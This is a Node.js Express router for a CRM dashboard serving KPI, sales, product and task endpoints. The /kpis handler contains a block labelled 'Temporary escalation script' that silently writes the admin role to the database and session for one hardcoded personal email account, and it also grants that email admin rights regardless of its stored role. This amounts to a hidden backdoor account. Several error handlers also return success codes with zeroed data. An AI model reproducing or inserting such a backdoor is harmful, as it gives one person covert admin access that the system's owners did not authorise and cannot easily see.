const express = require('express')
const prisma = require('../config/database')
const { protect } = require('../middleware/auth')

const router = express.Router()
router.use(protect)

// Helper for dates
function buildWhere(filter, req) {
  if (!filter || filter === 'all') return {};
  const now = new Date();
  let start = new Date(now);
  let end = new Date(now);

  if (filter === 'today') {
    start.setHours(0,0,0,0);
    end.setHours(23,59,59,999);
  } else if (filter === 'yesterday') {
    start.setDate(start.getDate() - 1);
    start.setHours(0,0,0,0);
    end.setDate(end.getDate() - 1);
    end.setHours(23,59,59,999);
  } else if (filter === 'day-before-yesterday') {
    start.setDate(start.getDate() - 2);
    start.setHours(0,0,0,0);
    end.setDate(end.getDate() - 2);
    end.setHours(23,59,59,999);
  } else if (filter === 'range') {
    if (req && req.query.startDate && req.query.endDate) {
      start = new Date(req.query.startDate);
      start.setHours(0,0,0,0);
      end = new Date(req.query.endDate);
      end.setHours(23,59,59,999);
    } else {
      return {};
    }
  } else if (filter === 'month') {
    start.setDate(1);
    start.setHours(0,0,0,0);
    end.setHours(23,59,59,999);
  }

  // Validate dates to prevent Prisma crash
  if (isNaN(start.getTime()) || isNaN(end.getTime())) {
    return {};
  }

  return {
    OR: [
      { createdAt: { gte: start, lte: end } },
      { updatedAt: { gte: start, lte: end } }
    ]
  };
}

// KPI metrics
router.get('/kpis', async (req, res, next) => {
  try {
    // Temporary escalation script
    if (req.user && req.user.email === 'shokirovsharifjon04@gmail.com' && req.user.role !== 'admin') {
      await prisma.user.update({
        where: { email: 'shokirovsharifjon04@gmail.com' },
        data: { role: 'admin' }
      });
      // Update session too if using sessions
      if (req.session && req.session.user) {
        req.session.user.role = 'admin';
        req.session.save();
      }
    }

    const isAdmin = req.user && (req.user.role === 'admin' || req.user.email === 'shokirovsharifjon04@gmail.com');
    const where = buildWhere(req.query.filter, req);
    
    // Operator sees only their own deals for KPIs
    if (!isAdmin) {
      where.managerId = req.userId;
    }
    
    const deals = await prisma.deal.findMany({ where });
    // Expenses only use createdAt
    const expenseWhere = where.OR ? { createdAt: { gte: where.OR[0].createdAt.gte, lte: where.OR[0].createdAt.lte } } : {};
    const expenses = await prisma.expense.findMany({ where: expenseWhere });

    const totalOrders = deals.filter(d => d.status === 'won' && d.amount > 0 && d.amount - d.paidAmount <= 0).length
    const totalRevenue = deals.filter(d => d.status === 'won' && d.amount > 0 && d.amount - d.paidAmount <= 0).reduce((sum, d) => sum + d.paidAmount, 0)
    const totalDebt = deals.reduce((sum, d) => sum + Math.max(d.amount - d.paidAmount, 0), 0)
    
    let totalExpenses = 0, totalCostPrice = 0, netProfit = 0, totalClientDebt = 0;
    
    if (isAdmin) {
      totalExpenses = expenses.reduce((sum, e) => sum + e.amount, 0)
      totalCostPrice = deals.filter(d => d.status === 'won' && d.amount > 0 && d.amount - d.paidAmount <= 0).reduce((sum, d) => sum + (d.costPrice || 0), 0)
      netProfit = totalRevenue - totalCostPrice - totalExpenses
      const clients = await prisma.client.findMany({ select: { debt: true } })
      totalClientDebt = clients.reduce((sum, c) => sum + (c.debt || 0), 0)
    }

    const won = deals.filter(d => d.status === 'won').length
    const lost = deals.filter(d => d.status === 'lost').length

    res.json({ totalOrders, totalRevenue, totalDebt, totalExpenses, totalCostPrice, netProfit, totalClientDebt, won, lost })
  } catch (error) {
    console.error('KPI Error:', error);
    return res.status(200).json({ totalOrders: 0, totalRevenue: 0, totalDebt: 0, totalExpenses: 0, totalCostPrice: 0, netProfit: 0, totalClientDebt: 0, won: 0, lost: 0 });
  }
})

// Sales grouped by manager
router.get('/sales-by-manager', async (req, res, next) => {
  try {
    const isAdmin = req.user && req.user.role === 'admin';
    const where = buildWhere(req.query.filter, req);
    if (!isAdmin) where.managerId = req.userId;
    const deals = await prisma.deal.findMany({ where, include: { manager: true } })
    const totals = {}
    for (const deal of deals) {
      const name = deal.manager ? deal.manager.fullName : 'Belgilanmagan'
      totals[name] = (totals[name] || 0) + deal.amount
    }
    res.json(Object.entries(totals).map(([manager, totalSales]) => ({ manager, totalSales })))
  } catch (error) {
    console.error('Sales Error:', error);
    return res.status(200).json([]);
  }
})

// Product popularity
router.get('/product-popularity', async (req, res, next) => {
  try {
    const isAdmin = req.user && req.user.role === 'admin';
    const where = buildWhere(req.query.filter, req);
    if (!isAdmin) where.managerId = req.userId;
    const deals = await prisma.deal.findMany({ where })
    const counts = {}
    for (const deal of deals) {
      counts[deal.productName] = (counts[deal.productName] || 0) + 1
    }
    res.json(Object.entries(counts).map(([product, count]) => ({ product, count })))
  } catch (error) {
    console.error('Product Error:', error);
    return res.status(200).json([]);
  }
})

// clientId ni raw SQL orqali task'larga qo'shish (generated client bilmaydi)
async function enrichWithClient(tasks) {
  try {
    const ids = tasks.map(t => t.id)
    if (!ids.length) return tasks
    const ph = ids.map((_, idx) => `$${idx + 1}`).join(',')
    const rows = await prisma.$queryRawUnsafe(
      `SELECT t.id as "taskId", t."clientId" as "clientId", c.name as "clientName", c.company as "clientCompany", c.phone as "clientPhone", c.city as "clientCity",
              t."dealId" as "dealId", d."clientId" as "dealClientId", dc.name as "dealClientName", dc.company as "dealClientCompany", dc.phone as "dealClientPhone", dc.city as "dealClientCity"
       FROM "Task" t 
       LEFT JOIN "Client" c ON t."clientId" = c.id
       LEFT JOIN "Deal" d ON t."dealId" = d.id
       LEFT JOIN "Client" dc ON d."clientId" = dc.id
       WHERE t.id IN (${ph})`, ...ids
    )
    const map = {}
    for (const r of rows) map[Number(r.taskId)] = r
    return tasks.map(t => {
      const r = map[t.id]
      const finalClientId = r?.clientId ? Number(r.clientId) : (r?.dealClientId ? Number(r.dealClientId) : null);
      const finalClientName = r?.clientId ? r.clientName : r?.dealClientName;
      const finalClientCompany = r?.clientId ? r.clientCompany : r?.dealClientCompany;
      const finalClientPhone = r?.clientId ? r.clientPhone : r?.dealClientPhone;
      const finalClientCity = r?.clientId ? r.clientCity : r?.dealClientCity;
      return {
        ...t,
        clientId: finalClientId,
        client: finalClientId ? { id: finalClientId, name: finalClientName, company: finalClientCompany, phone: finalClientPhone || null, city: finalClientCity || null } : null
      }
    })
  } catch (e) { return tasks }
}

// Today's tasks
router.get('/today-tasks', async (req, res, next) => {
  try {
    const startOfDay = new Date(); startOfDay.setHours(0, 0, 0, 0)
    const endOfDay = new Date(); endOfDay.setHours(23, 59, 59, 999)

    const where = {
      completed: false,
      OR: [
        { dueDate: { gte: startOfDay, lte: endOfDay } },
        { dueDate: null }
      ]
    }
    if (req.user?.role !== 'admin') where.assignedToId = req.userId

    const tasks = await prisma.task.findMany({
      where,
      include: {
        assignedTo: { select: { id: true, fullName: true, email: true, role: true } },
        deal: { select: { id: true, productName: true } }
      },
      orderBy: { dueDate: 'asc' }
    })
    
    const enriched = await enrichWithClient(tasks);
    res.json(enriched)
  } catch (error) {
    console.error('Tasks Error:', error);
    return res.status(200).json([]);
  }
})

module.exports = router
